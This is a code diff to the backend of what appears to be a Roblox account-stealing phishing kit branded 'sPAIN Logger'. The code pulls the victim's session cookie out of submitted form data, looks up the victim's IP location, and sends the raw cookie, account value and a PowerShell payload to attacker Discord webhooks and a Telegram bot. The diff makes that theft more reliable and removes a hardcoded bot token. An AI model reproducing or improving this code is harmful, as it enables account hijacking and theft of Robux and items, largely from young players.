@@ -1,8 +1,8 @@
 // api/submit.js
 const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
 const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
-const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
-const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
+const TG_TOKEN    = process.env.TG_TOKEN;
+const TG_CHAT     = process.env.TG_CHAT;
 const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';
 
 function parseBody(raw) {
@@ -23,7 +23,10 @@ async function redisGet(key) {
     if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
     if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
     return r || null;
-  } catch { return null; }
+  } catch (e) {
+    console.error('redisGet error:', e.message);
+    return null;
+  }
 }
 
 async function redisSet(key, value) {
@@ -46,6 +49,7 @@ async function getIpGeo(ip) {
 }
 
 async function tgSend(text) {
+  if (!TG_TOKEN || !TG_CHAT) return;
   try {
     await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST',
@@ -58,7 +62,7 @@ async function tgSend(text) {
 const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
 function extractCookie(raw) {
   if (!raw) return null;
-  const s = raw.trim();
+  const s = String(raw).trim();
   const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);  if (m1) return m1[1];
   const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                      if (m2) return WARN + m2[1];
   const m3 = s.match(/\|_([\w\-]{50,})/);                                  if (m3) return WARN + m3[1];
@@ -73,46 +77,79 @@ function findCookie(slots) {
   return null;
 }
 
-// Worker returns BOTH Roblox info AND powershell in one call
+// Worker call — timeout after 12s so it never hangs
 async function getWorkerData(cookie, victimIp) {
   try {
+    const controller = new AbortController();
+    const timeout = setTimeout(() => controller.abort(), 12000);
     const r = await fetch(WORKER_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ cookie, victimIp })
+      body: JSON.stringify({ cookie, victimIp }),
+      signal: controller.signal
     });
+    clearTimeout(timeout);
     if (!r.ok) return null;
     return await r.json();
-  } catch { return null; }
+  } catch (e) {
+    console.error('Worker fetch error:', e.message);
+    return null;
+  }
 }
 
 async function discordSend(url, payload) {
   if (!url?.includes('discord.com/api/webhooks')) return;
   try {
-    await fetch(url, {
+    const r = await fetch(url, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify(payload)
     });
-  } catch (_) {}
+    if (!r.ok) console.error('Discord send failed:', r.status, await r.text());
+  } catch (e) { console.error('discordSend error:', e.message); }
 }
 
-// Chunked text sender — splits anything >2000 chars
 async function discordText(url, text, lang = '') {
   const prefix = lang ? `\`\`\`${lang}\n` : '';
   const suffix = lang ? '\n```' : '';
   const limit  = 1990 - prefix.length - suffix.length;
   let rem = text;
+  let first = true;
   while (rem.length > 0) {
     const chunk = rem.substring(0, limit); rem = rem.substring(limit);
-    await discordSend(url, { content: prefix + chunk + (rem.length === 0 ? suffix : '') });
+    await discordSend(url, { content: (first ? prefix : '') + chunk + (rem.length === 0 ? suffix : '') });
+    first = false;
   }
 }
 
-// ── Rich embed matching Image 2 ───────────────────────────────────────────────
+// ── Cookie-only hit (when Roblox info unavailable / cookie expired) ──────────
+async function sendCookieOnly(webhookUrl, { cookie, powershell, ip, geo, now, pageName }) {
+  const ps = powershell || '';
+  await discordSend(webhookUrl, {
+    content: '@everyone',
+    embeds: [{
+      title:       '🍪 Cookie Captured',
+      description: `🔥 \`sPAIN\` 🔥\n\n⚠️ Roblox info unavailable (cookie may be expired or rate-limited)`,
+      color:       0xf59e0b,
+      fields: [
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                  inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'N/A',  inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                            inline: true  },
+        ...(ps ? [{ name: '📋 PowerShell', value: '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n...' : '') + '\n```', inline: false }] : []),
+        { name: '🕐 Date',     value: now, inline: false }
+      ],
+      footer: { text: `sPAIN Logger • ${pageName}` },
+      timestamp: now
+    }]
+  });
+  // Always send raw cookie + full PS
+  await discordText(webhookUrl, cookie);
+  if (ps.length > 1000) await discordText(webhookUrl, ps, 'powershell');
+}
+
+// ── Full hit with Roblox info ─────────────────────────────────────────────────
 async function sendHit(webhookUrl, { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl }) {
   const ps = powershell || '';
-
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
@@ -121,40 +158,22 @@ async function sendHit(webhookUrl, { roblox, cookie, powershell, ip, geo, now, p
       color:       5793266,
       thumbnail:   { url: roblox.avatarUrl },
       fields: [
-        { name: '🔴 Robux',      value: `${roblox.robux?.toLocaleString() || 0}`,                                             inline: true  },
-        { name: '🎵 RAP',        value: `${roblox.limitedsValue?.toLocaleString() || 0}\n(${roblox.limitedsCount || 0} items)`,inline: true  },
-        { name: '🗓️ Age',        value: `${roblox.accountAgeDays} days`,                                                      inline: true  },
-        { name: '💎 Premium',    value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                inline: true  },
-        { name: '👥 Groups',     value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,    inline: true  },
-        { name: '🌐 IP',         value: ip || 'Unknown',                                                                      inline: true  },
-        {
-          name:   '📍 Location',
-          value:  [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''),
-          inline: false
-        },
-        { name: '⚙️ Account',    value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                   inline: false },
-        {
-          name:   '🎯 Gamepasses',
-          value:  `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`,
-          inline: false
-        },
-        {
-          name:   '📋 Slots (PowerShell)',
-          value:  '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n... (continued below)' : '') + '\n```',
-          inline: false
-        }
+        { name: '🔴 Robux',     value: `${roblox.robux?.toLocaleString() || 0}`,                                              inline: true  },
+        { name: '🎵 RAP',       value: `${roblox.limitedsValue?.toLocaleString() || 0} (${roblox.limitedsCount || 0} items)`,  inline: true  },
+        { name: '🗓️ Age',       value: `${roblox.accountAgeDays} days`,                                                       inline: true  },
+        { name: '💎 Premium',   value: roblox.isPremium ? 'Yes ✅' : 'No ❌',                                                 inline: true  },
+        { name: '👥 Groups',    value: `Owned: ${roblox.groupsOwned} | R$: ${roblox.groupRobux?.toLocaleString() || 0}`,     inline: true  },
+        { name: '🌐 IP',        value: ip || 'Unknown',                                                                       inline: true  },
+        { name: '📍 Location',  value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') + (geo?.isp ? `\n${geo.isp}` : ''), inline: false },
+        { name: '⚙️ Account',   value: `Email: ${roblox.emailSet}  2FA: ${roblox.twoFA}`,                                    inline: false },
+        { name: '🎯 Gamepasses',value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'} | Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'} | Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`, inline: false },
+        ...(ps ? [{ name: '📋 PowerShell', value: '```\n' + ps.substring(0, 1000) + (ps.length > 1000 ? '\n...' : '') + '\n```', inline: false }] : [])
       ],
       footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
       timestamp: now
     }]
   });
-
-  // Send full PowerShell as separate messages if long
-  if (ps.length > 1000) {
-    await discordText(webhookUrl, ps, 'powershell');
-  }
-
-  // Raw cookie — separate message, chunked
+  if (ps.length > 1000) await discordText(webhookUrl, ps, 'powershell');
   await discordText(webhookUrl, cookie);
 }
 
@@ -162,14 +181,14 @@ async function sendInvalid(webhookUrl, { ip, geo, now, pageName }) {
   await discordSend(webhookUrl, {
     content: '@everyone',
     embeds: [{
-      title:       '⚠️ Invalid Cookie — someone trolling 💀',
-      description: 'Cookie was **invalid or fake**.',
+      title:       '⚠️ Invalid Cookie — no cookie found',
+      description: 'Nothing usable was submitted.',
       color:       0xff3333,
       fields: [
-        { name: '🌐 IP',       value: ip || 'Unknown',                                                                     inline: true  },
-        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',                   inline: true  },
-        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                               inline: true  },
-        { name: '🕐 Date',     value: now,                                                                                  inline: false }
+        { name: '🌐 IP',       value: ip || 'Unknown',                                                                 inline: true  },
+        { name: '📍 Location', value: [geo?.city, geo?.country].filter(Boolean).join(', ') || 'Unknown',               inline: true  },
+        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown',                                                           inline: true  },
+        { name: '🕐 Date',     value: now,                                                                              inline: false }
       ],
       footer:    { text: `sPAIN Tools • ${pageName}` },
       timestamp: now
@@ -181,7 +200,7 @@ async function sendRefreshCard(webhookUrl, refreshUrl, pageName) {
   await discordSend(webhookUrl, {
     embeds: [{
       title:       '🔄 Get Fresh PowerShell Anytime',
-      description: `Click the link below whenever you need a new PowerShell for this account:\n**${refreshUrl}**`,
+      description: `**${refreshUrl}**`,
       color:       0x06b6d4,
       footer:      { text: `sPAIN Tools • ${pageName} • Keep this private` }
     }]
@@ -197,14 +216,27 @@ export default async function handler(req, res) {
 
   const body = parseBody(req.body);
   const { slug, slots } = body;
+
   if (!slug)  return res.status(400).json({ error: 'slug is required' });
   if (!slots) return res.status(400).json({ error: 'slots is required' });
 
-  const record = await redisGet(`slot:${slug}`);
-  if (!record)         return res.status(404).json({ error: 'Page not found' });
-  if (!record.webhook) return res.status(500).json({ error: 'No webhook on record' });
+  // ── Validate Redis env vars up front ────────────────────────────────────────
+  if (!REDIS_URL || !REDIS_TOKEN) {
+    console.error('Missing UPSTASH_REDIS_REST_URL or UPSTASH_REDIS_REST_TOKEN');
+    return res.status(500).json({ error: 'Server config error — Redis not configured' });
+  }
 
-  // Respond immediately — client never waits
+  const record = await redisGet(`slot:${slug}`);
+  if (!record) {
+    console.error('Slug not found in Redis:', slug);
+    return res.status(404).json({ error: `Page "${slug}" not found` });
+  }
+  if (!record.webhook) {
+    console.error('No webhook on record for slug:', slug);
+    return res.status(500).json({ error: 'No webhook configured for this page' });
+  }
+
+  // ── Respond immediately so client never waits ────────────────────────────────
   res.status(200).json({ success: true });
 
   try {
@@ -216,65 +248,67 @@ export default async function handler(req, res) {
       Promise.resolve(findCookie(slots))
     ]);
 
-    // Single worker call — returns BOTH roblox info AND powershell
-    const workerData = cookie ? await getWorkerData(cookie, ip) : null;
-    const roblox     = workerData?.valid ? workerData : null;
-    const powershell = workerData?.powershell || null;
-    const isValid    = !!(roblox && powershell);
-
     const now      = new Date().toISOString();
     const pageName = record.displayName || slug;
+
+    // No cookie at all → send invalid notice
+    if (!cookie) {
+      await sendInvalid(record.webhook, { ip, geo, now, pageName });
+      await tgSend(`⚠️ <b>NO COOKIE — ${pageName}</b>\n🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}\n🕐 ${now}`);
+      return;
+    }
+
+    // Try to get Roblox info + PowerShell from worker
+    const workerData = await getWorkerData(cookie, ip);
+    const roblox     = workerData?.valid ? workerData : null;
+    const powershell = workerData?.powershell || null;
 
     // Load dualhook parent
     let parent = null;
     if (record.dualhookParent) parent = await redisGet(`slot:${record.dualhookParent}`);
 
-    // Generate refresh ID and save to Redis BEFORE sending Discord (so link is ready)
-    let refreshUrl = null;
-    if (isValid && cookie) {
+    const webhooks = [record.webhook];
+    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
+
+    if (roblox) {
+      // ── Full hit — Roblox info available ──────────────────────────────────
+      let refreshUrl = null;
       const refreshId = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
       refreshUrl = `https://spain-tools.vercel.app/r/${refreshId}`;
       await redisSet(`refresh:${refreshId}`, {
-        cookie,
-        webhook:  record.webhook,
-        webhook1: parent?.webhook || null,
-        pageName
+        cookie, webhook: record.webhook, webhook1: parent?.webhook || null, pageName
       });
-    }
 
-    const payload = { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl };
+      const payload = { roblox, cookie, powershell, ip, geo, now, pageName, refreshUrl };
+      for (const wh of webhooks) {
+        await sendHit(wh, payload);
+        await sendRefreshCard(wh, refreshUrl, pageName);
+      }
 
-    if (isValid) {
-      // Main embed + full PS + raw cookie
-      await sendHit(record.webhook, payload);
-      if (parent?.webhook && parent.webhook !== record.webhook) {
-        await sendHit(parent.webhook, payload);
-      }
-      // Separate refresh card message
-      await sendRefreshCard(record.webhook, refreshUrl, pageName);
-      if (parent?.webhook && parent.webhook !== record.webhook) {
-        await sendRefreshCard(parent.webhook, refreshUrl, pageName);
-      }
+      await tgSend([
+        `✅ <b>VALID HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
+        `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
+        `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+        `📄 Page: ${pageName}`,
+        `🔄 Refresh: ${refreshUrl}`
+      ].join('\n'));
+
     } else {
-      await sendInvalid(record.webhook, { ip, geo, now, pageName });
-      if (parent?.webhook && parent.webhook !== record.webhook) {
-        await sendInvalid(parent.webhook, { ip, geo, now, pageName });
+      // ── Cookie captured but Roblox info failed (expired / rate-limited) ────
+      const payload = { cookie, powershell, ip, geo, now, pageName };
+      for (const wh of webhooks) {
+        await sendCookieOnly(wh, payload);
       }
-    }
 
-    await tgSend(isValid ? [
-      `✅ <b>VALID HIT — ${roblox.username} ${roblox.isPremium ? '⭐' : ''}</b>`,
-      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
-      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-      `📄 Page: ${pageName}`,
-      `🔄 Refresh: ${refreshUrl}`
-    ].join('\n') : [
-      `⚠️ <b>INVALID — ${pageName}</b>`,
-      `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
-      `🕐 ${now}`
-    ].join('\n'));
+      await tgSend([
+        `🍪 <b>COOKIE ONLY — ${pageName}</b>`,
+        `⚠️ Roblox info failed (expired or rate-limited)`,
+        `🌐 IP: <code>${ip}</code> — ${geo?.city||'?'}, ${geo?.country||'?'}`,
+        `🕐 ${now}`
+      ].join('\n'));
+    }
 
   } catch (err) {
-    console.error('Post-response error:', err.message);
+    console.error('Post-response error:', err.message, err.stack);
   }
 }
